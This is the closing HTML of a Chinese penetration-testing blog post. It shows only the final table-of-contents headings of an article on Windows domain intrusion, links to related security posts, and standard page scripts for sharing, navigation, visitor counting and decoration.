toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7"><span class="toc-number">8.2.</span> <span class="toc-text">获取域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%94%B6%E9%9B%86"><span class="toc-number">8.3.</span> <span class="toc-text">域收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7token"><span class="toc-number">8.4.</span> <span class="toc-text">获取域内用户token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87Windows%E4%B8%8A%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">8.5.</span> <span class="toc-text">查看目标Windows上登录的用户</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/" title="上一篇: GOLDENEYE-1">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="下一篇: 瑞士军刀nc">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/">GOLDENEYE-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/02/Metasploit%20Framework/">Metasploit Framework</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">瑞士军刀nc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFS三层网络渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">vulnhub靶机Os-hackNos-1</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
